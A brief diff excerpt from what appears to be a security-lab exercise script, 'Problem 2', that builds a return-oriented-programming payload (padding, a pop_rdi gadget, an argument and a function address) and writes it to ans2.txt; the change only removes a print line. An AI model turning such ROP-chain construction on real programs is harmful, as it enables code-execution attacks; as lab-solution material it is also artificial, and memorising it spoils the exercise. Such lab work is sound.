@@ -18,5 +18,3 @@ payload = padding + pop_rdi + arg1 + func2_addr
 
 with open("ans2.txt", "wb") as f:
     f.write(payload)
-
-print("Problem 2 Payload generated!")
